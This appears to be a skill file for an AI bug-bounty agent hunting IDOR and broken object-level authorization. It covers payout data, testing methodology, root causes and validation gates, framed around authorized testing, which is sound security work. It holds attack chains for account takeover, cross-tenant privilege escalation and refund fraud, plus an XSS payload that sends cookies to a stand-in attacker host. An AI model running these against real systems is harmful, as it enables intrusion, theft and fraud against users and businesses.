---
name: idor
description: >-
  Hunting skill for idor vulnerabilities. Built from 26 public bug bounty reports. Use when hunting idor on
  any target. Combined with the HackerOne field guide (real disclosed-report data: where it pays, quick
  wins, payload banks). Hunt IDOR and broken object-level authorization. Use when APIs expose IDs, files,
  invoices, messages, or tenant-scoped resources. Backed by 450 disclosed HackerOne reports.
---

# IDOR — Combined Field Guide

**Merged skill.** This fuses two complementary sources into one reference:

- **Part 1 — HackerOne field guide:** statistics from disclosed reports, "where it pays," quick wins, and curated payload banks.
- **Part 2 — Bug hunter methodology:** autonomous testing priority, canary discipline, crown-jewel targeting, OOB/validation gates, and reporting guidance.

**How to use:** Open with Part 2 for execution discipline (set your canary, know your success/failure gate). Use Part 1 to prioritize targets and pull payloads. Before reporting, run the validation gates in both parts.

---

<!-- ============ PART 1: HACKERONE FIELD GUIDE (data + payloads) ============ -->

# IDOR / Object-Level Authorization — HackerOne field guide

Built from **450** publicly disclosed HackerOne reports (2015–2026). Corpus: `~/.local/share/hackerone-reports/`.

**Reference files (load on demand):**

- `references/payloads.md` — payload banks, probes, wordlists, Nuclei templates, observed parameters
- `references/techniques.md` — quick wins, bypasses, real-report techniques, deeper checklists

## Signal

- Reports: **450** · paid: **107**
- Median bounty **$500** · p90 **$5,000** · max **$20,000** · total **$199,099**
- Median upvotes **31**

## Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| GitLab | 12 | $44,550 | 858 |
| Mail.ru | 37 | $24,260 | 971 |
| New Relic | 18 | $19,250 | 379 |
| HackerOne | 20 | $18,000 | 3370 |
| Snapchat | 1 | $15,000 | 801 |
| Reddit | 7 | $10,500 | 813 |
| PayPal | 1 | $10,500 | 797 |
| GitHub | 6 | $10,000 | 657 |

## Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`id` `user_id` `account_id` `org_id` `team_id` `order_id` `invoice_id` `file_id` `message_id` `project_id` `tenant` `uuid`

## Tools

`Autorize` · `Burp Repeater` · `ffuf` · `mitmproxy` · `Postman`

## Escalation chains

- IDOR read -> PII exposure.
- IDOR write -> account takeover.
- IDOR + mass assignment -> privilege escalation.

## Related

- `authz-bypass` (1,386 reports)
- `info-disclosure` (1,827 reports)
- `graphql` (79 reports)

## Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

---

<!-- ============ PART 2: BUG HUNTER METHODOLOGY (execution + validation) ============ -->

## Crown Jewel Targets

**Why IDOR pays big:**
- Direct access to other users' data without authentication bypass — clear, demonstrable impact
- Chains easily with privilege escalation, financial fraud, and account takeover
- Affects virtually every application with user-owned resources

**Highest-value asset types (by payout potential):**

| Asset Type | Why It Pays |
|---|---|
| Financial documents / billing APIs | PII + financial data exposure (Shopify, Uber, PayPal) |
| Private repositories / source code | IP theft, critical data loss (GitHub) |
| User messages / DMs | Privacy violation at scale (Reddit) |
| Account management endpoints | User addition, deletion, privilege escalation (PayPal, Mozilla) |
| Business/org administration | Cross-tenant escalation, employee PII (Uber) |
| Content moderation/admin actions | Operational sabotage (Reddit mod logs) |

**Programs that pay most for IDOR:**
- Platforms with multi-tenancy (SaaS, B2B tools)
- Fintech and payment processors
- Social platforms with private content
- Developer tools with org/repo isolation

---

## Attack Surface Signals

**URL patterns that scream IDOR:**
```
/api/v1/users/{id}/
/api/v*/orders/{order_id}
/invoices/download?id=
/reports/{uuid}/
/messages/{thread_id}
/admin/orgs/{org_id}/members
/migration/{migration_id}/files
/graphql (query params with IDs)
/api/business/{business_id}/
/vouchers/{voucher_id}/policy
```

**Response header signals:**
- `Content-Type: application/json` on endpoints accepting raw IDs
- No `X-Frame-Options` or CORS misconfigs paired with ID params
- `Authorization: Bearer` tokens that are user-scoped but hit org-level resources

**JavaScript source patterns:**
```javascript
// Look for hardcoded or interpolated IDs in JS
fetch(`/api/v1/users/${userId}/profile`)
axios.get('/invoices/' + invoiceId)
graphql query { billingDocument(id: $docId) }
// Redux/state stores exposing foreign IDs
state.currentUser.organizationId
```

**Tech stack signals:**
- GraphQL endpoints (query-based IDORs are often missed)
- REST APIs with sequential integer IDs (most vulnerable)
- UUIDs that are predictable or leaked in other responses
- Multi-tenant SaaS apps with `org_id`, `account_id`, `business_id` params
- Mobile apps (Burp the APK — mobile APIs often skip authorization checks)

---

## Step-by-Step Hunting Methodology

1. **Map all object references in the application**
   - Browse every feature authenticated as User A
   - Capture all requests in Burp Suite
   - Filter for requests containing: `id=`, `_id=`, `uuid=`, `/v1/{noun}/{id}`, query params with numeric/UUID values

2. **Enumerate ID types**
   - Sequential integers → enumerate ±1, ±100
   - UUIDs → check if they appear in other responses or JS files
   - Hashed IDs → check if leaked in public endpoints, metadata, or GraphQL introspection

3. **Create two separate accounts (same privilege level)**
   - User A: resource owner
   - User B: attacker account
   - Log all IDs belonging to User A while authenticated as User A

4. **Replay User A's resource IDs as User B**
   - Replace session cookie/token with User B's credentials
   - Send identical requests referencing User A's object IDs
   - Test ALL HTTP verbs: GET, POST, PUT, PATCH, DELETE on each endpoint

5. **Test cross-tenant/cross-org scenarios**
   - Create accounts in separate organizations/businesses
   - Test if Org B's session can reference Org A's IDs
   - Pay special attention to admin/management endpoints

6. **Test GraphQL specifically**
   - Run introspection: `{ __schema { queryType { fields { name } } } }`
   - For every query/mutation taking an `id` argument, substitute another user's ID
   - Test both queries (read) and mutations (write/delete)

7. **Test write/destructive operations, not just reads**
   - Can User B DELETE User A's resources?
   - Can User B MODIFY User A's content?
   - Can User B ADD themselves to User A's account?

8. **Chain IDORs together**
   - Use one IDOR's leaked data (org IDs, user IDs) to fuel the next
   - IDOR → leaked ID → second IDOR → privilege escalation

9. **Test state-changing edge cases**
   - Expired tokens/invites that can still be accepted
   - Race conditions on resource IDs
   - Indirect references: `?sort=id` or `?filter[user_id]=`

10. **Document the exact differential**
    - Confirm User B has NO legitimate access to User A's resource
    - Screenshot/log the 200 OK vs expected 403/404

---

## Common Root Causes

1. **Missing ownership check in ORM queries**
   ```javascript
   // VULNERABLE: fetches any record
   const invoice = await Invoice.findById(req.params.id);
   
   // SECURE: scopes to authenticated user
   const invoice = await Invoice.findOne({ _id: req.params.id, userId: req.user.id });
   ```

2. **Authorization at the route level, not object level**
   - Developer checks "is user logged in?" but not "does this user own this object?"
   - Middleware confirms authentication; individual handlers skip ownership validation

3. **Trusting client-supplied IDs in request bodies**
   - Mobile apps or SPAs send `org_id` in POST body; server uses it directly without verifying caller belongs to that org

4. **GraphQL resolvers without field-level authorization**
   - Query resolvers fetch by ID from database without checking if the requesting user has permission
   - Especially common when resolvers are auto-generated from schema

5. **Inconsistent authorization across HTTP verbs**
   - GET endpoint is protected; POST/DELETE on same resource path is not
   - Common in APIs built incrementally by different developers

6. **Indirect references exposed via related objects**
   - Object A (accessible) contains a reference to Object B (should be private)
   - Developer only protects direct access to B, not indirect references through A

7. **Race conditions and state-based IDORs**
   - Authorization checked at creation time, not at access time
   - Invites/tokens remain valid after the granting permission is revoked

8. **Multi-tenant isolation failures**
   - Developers implement per-user access control but forget cross-org boundaries
   - `user_id` check present; `org_id` / `tenant_id` check absent

---

## Gate 0 Validation

Before writing the report, answer all three:

1. **What can the attacker DO right now?**
   Be specific: "Attacker with a valid account can send a GET request to `/api/v1/invoices/{victim_invoice_id}` and receive the victim's full billing document including name, address, and payment amount — without any relationship to that account."

2. **What does the victim LOSE?**
   Map to CIA triad: confidentiality (data exposed), integrity (data modified), or availability (data deleted). "Victim loses confidentiality of private financial records" or "Victim's content is deleted by a third party" — vague answers fail.

3. **Can it be reproduced in 10 minutes from scratch?**
   - Two fresh accounts created ✓
   - Exact HTTP request documented with victim's ID ✓
   - 200 OK response showing victim's data (or confirmed state change) ✓
   - No reliance on pre-existing state or timing ✓
   
   If you can't demo it reproducibly, do not file the report.

---

## Real Impact Examples

**Scenario 1: Financial Data Exposure + Cross-Account Billing Fraud (Uber-style)**
An attacker discovers two related IDORs: one allows reading any organization's voucher policy configuration (exposing org IDs, employee email lists, and payment methods), and a second allows modifying voucher policies using those leaked IDs. Chained together, this enables the attacker to redirect charges to an arbitrary business account, expose employee PII across organizations, and take over invitation links — all without any elevated privileges beyond a basic user account. Impact: financial fraud + mass PII exposure across the B2B platform.

**Scenario 2: Private Repository Read via IDOR on Migration Endpoint (GitHub-style)**
A migration feature allows users to upload files to a migration job. The `migration_id` parameter is not validated against the authenticated user's ownership. An attacker creates their own migration, observes the ID format, and substitutes another user's private migration ID — gaining read access to source code files from private repositories they have no access to. Impact: complete confidentiality bypass for private intellectual property.

**Scenario 3: Account Takeover Chain via Message IDOR (Reddit-style)**
An attacker accesses another user's private message threads by substituting their `thread_id` in a messaging API endpoint. The response includes message content, metadata, and — critically — session or verification tokens sent via internal messages. The attacker leverages the token found in the messages to perform account recovery steps, escalating a read-only IDOR into full account takeover. Impact: complete account compromise of targeted users at scale.

---

## Chains & Compositions (Senior Hunting)

Standalone IDOR gets paid at Low-Medium for cross-tenant *read*. The real money is in chaining IDOR to a *state-change* primitive that doesn't normally permit cross-tenant action — turning "I can see victim's data" into "I own victim's account". The six chains below are the highest-paying IDOR compositions on modern bug-bounty programs.

### Chain 1 — IDOR on `/api/users/{id}/email` + Missing Re-Auth → Password Reset → ATO

- **A.** Confirm IDOR on the email-change endpoint — request `PUT /api/users/{victim_id}/email {"email":"attacker@evil"}` from attacker's session; server changes the victim's email without ownership check.
- **B.** Hit the password-reset flow on the victim's account — server emails reset link to the **new** email (attacker's).
- **C.** Open reset link, set new password, log in as victim.
- **Impact:** Silent ATO — victim sees no email change notification because the change happens via API not via the user-facing "change email" UI which has its own audit log.
- **Real shape:** Classic ATO pattern across many SaaS bug-bounty disclosures 2018-2024. Cross-refs `account-takeover` Path 2 (email change without re-auth).

### Chain 2 — IDOR on File-Download + Filename-Controlled `Content-Disposition` → Reflected-XSS-Via-Download → Session Theft

- **A.** IDOR on `/api/files/{id}/download` returns any user's file given the ID.
- **B.** The download endpoint sets `Content-Disposition: attachment; filename="<user-supplied-filename>"` without sanitising newlines or quotes — attacker uploads a file with filename `"; <script>fetch('https://attacker/x?c='+document.cookie)</script>; foo.txt`.
- **C.** Victim navigates to download → browser interprets the injected script in the response header context as HTML → JS runs same-origin → cookie/token exfil.
- **Impact:** ATO via IDOR + filename-controlled response header — neither primitive alone is critical; the chain is.
- **Real shape:** Multiple disclosed cases involving Office 365 SharePoint download endpoints, GitLab attachment downloads, SaaS export endpoints. Pairs with `xss` Chain 1 (response-header XSS class).

### Chain 3 — IDOR via GraphQL `node(id:)` GID + Relay Relation Traversal → Cross-Tenant Mass Data Extraction

- **A.** Target uses GraphQL with Relay-style global IDs (`gid://shopify/Customer/<n>` or base64-encoded `type:id` patterns).
- **B.** `node(id:"<victim_gid>") { ... on Customer { email orders { totalPrice paymentMethods { cardLast4 } } } }` — the top-level `node()` resolver auths the requester, but nested relations don't re-check ownership against the resolved Customer.
- **C.** Iterate IDs (decoding base64 to extract numeric, incrementing) to exfil emails, order totals, payment methods across the entire customer base.
- **Impact:** Mass cross-tenant PII / financial data extraction. Single bug, full database.
- **Real shape:** Shopify Billing IDOR H1 #2207248 ($5,000); HackerOne PolicyPageAssetGroup IDOR H1 #1618347 ($25,000). Cross-refs `graphql` Disclosed Report Citation #5 and #2.

### Chain 4 — IDOR on `/api/teams/{id}/members` + Mass-Assignment in Body → Role Escalation on Victim Team

- **A.** Standard horizontal IDOR — `POST /api/teams/{victim_team_id}/members {"email":"attacker@evil"}` adds attacker as a normal member without ownership check.
- **B.** The body accepts additional fields the API didn't filter: `{"email":"attacker@evil", "role":"OWNER", "permissions":["*"]}` — mass assignment leaks into the role field.
- **C.** Attacker is added to the victim team as OWNER. Now has full admin access to the victim team's resources and can remove the real owners.
- **Impact:** Cross-tenant privilege escalation via IDOR + mass assignment. The single most efficient takeover chain on SaaS team-management APIs.
- **Real shape:** Shopify undocumented `fileCopy` mutation H1 #981472 (2020, $2,000); Stripe `UpdateAtlasApplicationPerson` cross-tenant mutation H1 #1066203 (2020). Cross-refs `graphql` Disclosed Report Citation #7 and #8; pairs with `api-misconfig` Mass Assignment section.

### Chain 5 — Soft-Delete IDOR + Post-Removal Token Validity → Persistent Cross-Tenant Access

- **A.** Identify the "remove member" endpoint that flips an `active=false` flag but doesn't invalidate the session/PAT.
- **B.** Log in as the to-be-removed user; capture session cookie or PAT.
- **C.** Have the org admin remove the user via the normal flow. Wait. Re-issue API calls using the captured token — IDOR is now *temporal* (the user no longer has permission per the policy table, but the cached auth context still passes).
- **Impact:** Weeks of post-termination cross-tenant access; GDPR/CCPA breach exposure; potential extortion leverage.
- **Real shape:** Shopify removed-staff persistence class (2022). Cross-refs `misc` Chain 1 — same root cause shape, different starting primitive.

### Chain 6 — Double-IDOR (`/users/{id}/orders → /orders/{order_id}/refund`) → Financial Impact on Victim Merchant

- **A.** First IDOR: `GET /api/users/{victim_id}/orders` returns the victim's order list without ownership check — yields legitimate `order_id` values.
- **B.** Second IDOR: `POST /api/orders/{order_id}/refund` issues refunds without checking that the requester owns the merchant/order.
- **C.** Trigger refund on each of the victim merchant's recent orders. Money moves from merchant to customer (who is also attacker-controlled).
- **Impact:** Direct financial loss to the victim merchant. Mass-exploitable across the platform's merchant base.
- **Real shape:** Multiple disclosed e-commerce platform IDOR chains 2019-2023. Cross-refs `logic-and-design` Chain (financial impact via state-machine confusion).

### Operator-level pattern

When you confirm a read-IDOR at A, immediately ask: *what state-change accepts the same ID and might also be IDOR'd?* The chain is usually one of: (1) password reset / email change at terminal step → ATO; (2) refund / withdraw / transfer → financial; (3) role-change / membership-add → privilege escalation. If your read-IDOR doesn't compose to one of those, the standalone payout is what you get. Hunt for both halves — the second is often easier to find because it shares the same auth bug class as the first.

Cross-references:
- `account-takeover` — Chain 1, 5
- `xss` — Chain 2
- `graphql` — Chains 3, 4
- `misc` — Chain 5
- `logic-and-design` — Chain 6

---

## Related Skills & Chains

- **`auth-bypass`** — Object-level authorization failure plus route-level auth absence is the canonical IDOR-amplifier. Chain primitive: missing `req.user.id` scoping in ORM query + missing middleware on legacy `/v1/` route = unauthenticated cross-tenant data read via direct ID substitution → bulk PII dump without any session at all.
- **`account-takeover`** — Profile-edit IDOR is the most direct path from "read someone's data" to "own their account." Chain primitive: `PATCH /api/users/{victim_uid}` accepts attacker's session + victim UID → set `email=attacker@evil.com` → trigger password reset → reset link arrives at attacker → full ATO without ever knowing victim credentials.
- **`graphql`** — GraphQL resolvers without field-level authorization are IDOR-by-default; introspection hands you the schema. Chain primitive: `__schema` introspection → enumerate every mutation accepting `id:` argument → substitute victim IDs across `updateUser`, `deleteOrg`, `transferBilling` mutations → mass IDOR fan-out from one introspection query.
- **`security-arsenal`** — Pull the IDOR Bypass Tables section for HTTP-parameter-pollution payloads (`?id=own&id=victim`), nested-JSON wrappers (`{"data":{"id":"VICTIM"}}`), and parameter-name variations (`uid`/`userId`/`user_id`/`account`) when the first direct substitution returns 403.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on an IDOR that returns 200 but doesn't actually leak data (empty array, redacted fields, "access denied" in body with 200 status). The 200-but-no-data IDOR is the #1 N/A driver on H1/Bugcrowd.

## Web-Research Methodology Additions (2026)

Sourced from OWASP API Security Top 10 (API1:2023 BOLA), the OWASP IDOR Prevention Cheat Sheet, a 2026 multi-account testing guide, and the Bugcrowd IDOR methodology (see D). Extends the chain library already in this skill with current discovery/validation discipline.

### A. Discovery checklist — concrete places, parameters, headers, file types, and workflows to look for this bug class

- **OWASP's three ingredients:** an object, a reference to it (ID/UUID/account number/token/slug), and a missing object-level authorization check. Exposing an ID is not the bug; the missing check is. Tag as CWE-639 (child of CWE-863).
- **Where references hide (DeepStrike table):** URL path `/api/users/123/settings`; query `?account=88231`; JSON/form body `"order_id": 5520` or a hidden `<input name="user_id">`; **headers/cookies** `X-Account-Id`, `X-User-ID`, `X-UID`, account cookies; GraphQL `node(id:)` / mutation args; **nested resources** `/orders/77/items/3` (parent checked, child not); file/export names `/downloads/invoice-2026-0042.pdf`; async jobs `/reports/status?job=af31…`; **batch endpoints** `/api/bulk?ids=1,2,3` where each member of the list must be checked.
- **Four types to map (ACSC/CISA/NSA AA23-208A):** horizontal (peer's data), vertical (higher-privilege record), object-level (modify/delete someone else's object), function-level (invoke an action reserved for another role). The last two shade into BFLA.
- **Account setup:** at least two same-role accounts (A owner, B attacker), a user C in a second tenant for multi-tenant apps, one account per privileged role, plus an unauthenticated session. Create test objects for each so ownership ground truth is known.
- **Burp workflow (Bugcrowd):** browse every feature while proxying; use the HTTP History + scope "Show only in-scope items"; use a normal tab for user A and an incognito/secret tab for B so you never log yourself out. Mine `.html`/`.js` files for AJAX calls and endpoints the UI never links; check `archive.org` old JS bundles and dorks for retired endpoints.
- **Capture ALL requests, including secondary flows:** reported cases hid the IDOR in a second-purchase credit-card selection request and in `POST /messages/5955/invite` with `user=testaccount2` — the primary `/messages/5955` GET was correctly protected. Play every workflow to completion.
- **Tooling:** Burp `Autorize`, `AuthMatrix`, `Authorize`, `Authz`; `Wsdler`/SoapUI/Postman for WSDL/Swagger APIs; `ffuf` for ID enumeration; `mitmproxy` for scripted replay. Turn the role matrix into CI tests (OWASP Authorization Testing Automation Cheat Sheet).
- **Classic real cases worth modelling:** First American Financial (sequential document number → 800M+ records, SEC penalty); CVE-2026-55255 Langflow (UUID flow ID still IDOR'd, CISA KEV — UUIDs are NOT a fix); CVE-2021-36539 Canvas (file *preview* URL lacked the check); CVE-2017-11357 Telerik (IDOR → file upload → RCE).

### B. Techniques & bypasses — specific actionable techniques and payload shapes, not generic advice

- **Direct substitution:** `GET /api/invoices/1001` (Alice) → `GET /api/invoices/1002` with B's cookie. If 200 + Bob's data, it is IDOR. Body variant: `PATCH /api/profile {"user_id":4471,"email":"attacker@evil"}` → ATO via password reset if the server trusts the client `user_id`.

Minimum replay set for one object (as attacker B):
```
GET    /api/invoices/1002            -> read Bob's invoice
PATCH  /api/invoices/1002  {"status":"paid"}   -> write to Bob's object
DELETE /api/invoices/1002            -> destroy Bob's object
POST   /api/bulk?ids=1001,1002       -> check EVERY id in the batch
GET    /orders/77/items/3            -> check child through parent too
POST   /graphql  {"query":"mutation { deleteReports(reportKeys:[\"<DOC_ID>\"]) }"}
```
- **HTTP Parameter Pollution (HPP):** duplicate the parameter — `?id=own&id=victim` and `/api/bulk?ids=own&ids=victim` — exploitable when the first value passes the check and a framework (Express/PHP/Django multi-value) uses the last. Also try nested JSON wrappers `{"data":{"id":"VICTIM"}}` and name variants `uid` / `userId` / `user_id` / `account`.
- **Encoded / hashed references:** decode Base64/hex IDs, increment the numeric part, re-encode. If the ID is hashed, look for the hash leaked in the page source, a `Referer` header, an in-app message, or another API response — then replay it with B's session. Cross-reference `security-arsenal` IDOR bypass tables.
- **Create-request manipulation:** when the client generates IDs, send `id=-1`, `id=0`, or an existing ID on create — several apps then let you edit/delete another user's object. If no `id` param appears on create, add one using the key name observed on the edit/delete request.
- **Forge a *valid* request:** when replaying A's request as B, replace the CSRF token with B's, keep the XHR `Content-Type`, and preserve custom headers (`W-User-Id`, `X-User-Id`, `User-Token`, `X-CSRF-Token`). A token mismatch produces a misleading error and a false negative.
- **Method / version / path fan-out:** if GET is protected, test `PUT`, `PATCH`, `DELETE` on the same object; try older `/v1/` routes, alternate hostnames, nested children, export/preview endpoints, and batch IDs. The Canvas case shows preview/export paths are routinely missed.
- **Blind IDOR:** a state change may be observable only out-of-band — e.g. editing another user's object triggers an email containing its details. Watch the out-of-band channel, not just the HTTP response.
- **Header-driven impersonation:** in test/debug deployments `X-User-ID`, `X-UID`, `W-User-Id` may be trusted — swap them to act as another user. Combine with password-reset / password-change / account-recovery requests where a leaked `user_id` yields ATO.
- **Amplification:** chain a low-impact IDOR with self-XSS into "IDOR + stored XSS" (P2), or with mass assignment (`role=OWNER`) into cross-tenant privilege escalation. See the Chain 1–6 library above.
- **GraphQL per-resolver gap:** introspect `__schema`, then test each query/mutation accepting an `id:` argument independently — one resolver may check ownership while a sibling (e.g. a nested relation or a delete mutation) does not. OWASP's scenario #3 is exactly a `deleteReports(reportKeys:[<DOCUMENT_ID>])` mutation with no permission check.
- **Indirect reference maps:** when raw IDs are replaced by per-user "1, 2, 3" indexes or opaque tokens, still supply another user's index/token — the map must be scoped to the session. If translation is global, the obfuscation provides no protection.
- **Temporal / post-removal IDOR:** capture a session or PAT, have the owner remove you, then replay the token — authorization checked at creation but not at access time is a known persistence variant (see Chain 5 above).
- **Secure-lookup contrasts that tell you what to probe (OWASP):** `Project.find(params[:id])` / `findById(id)` = global lookup (vulnerable); `@current_user.projects.find(params[:id])` / `findByIdAndOwnerId(id, currentUser().getId())` = scoped (safe). If the target uses global lookup anywhere, every endpoint using it is a candidate.

### C. Validation / proof bar — how to confirm the bug and avoid false positives

- **Role matrix evidence:** for each object type × action (read, create, update, delete, export, share, approve), record expected allow/deny, then replay every deny cell across A, B, C, and no session. A finding is a deny cell that returns data or changes state.
- **Body-diff the 200:** the #1 N/A driver is "returns 200 but no data" (empty array, redacted fields, "access denied" in body). Confirm the response actually contains the other user's data or a real state change — not merely a success status.
- **Ownership ground truth:** state the account used, the object owner, the exact request/response pair, and the expected matrix cell. Create the victim object yourself in the test account so there is no ambiguity about who owns it.
- **Deny-by-default check:** a correct fix returns 403 **or** 404; 404 is preferable when existence is sensitive (OWASP Spring example maps both missing and unauthorized to 404). If the "fixed" endpoint returns 200 with a different body, retest.
- **Negative controls:** show the same request with B's session on B's own object works (proves the session is valid) and with A's session on B's object is denied (proves the check exists elsewhere). This rules out a global "endpoint is broken" explanation.
- **Stay safe:** use only your own test accounts/data, stop at proof, do not enumerate real users. Scanners cannot prove this class — the exploiting request looks perfectly valid — so manual multi-account evidence is the bar (OWASP/AA23-208A).
- **Normalize before the check:** if a bypass works with `%2e`, double-encoding, trailing dots, or case variants of the ID, the authorization layer and data layer are normalizing differently — record the exact canonical form that slips through.
- **Severity follows the object, not the label:** OWASP rates BOLA exploitability Easy / prevalence Widespread. Read of a display name is Low; read of financial records, email change → ATO, deletion, or an IDOR that reaches RCE (Telerik) is High–Critical. Map to the Bugcrowd-style P1–P4 impact ladder before scoring.
- **Reproducibility:** two fresh accounts, exact request with victim ID, and a second tester reproducing in <10 minutes; turn the confirmed case into an automated two-user regression test.

### D. Sources — numbered list of the actual URLs you fetched

1. https://api-security.owasp.org/editions/2023/en/0xa1-broken-object-level-authorization/
2. https://deepstrike.io/blog/what-is-idor
3. https://www.bugcrowd.com/blog/how-to-find-idor-insecure-direct-object-reference-vulnerabilities-for-large-bounty-rewards/
4. https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html
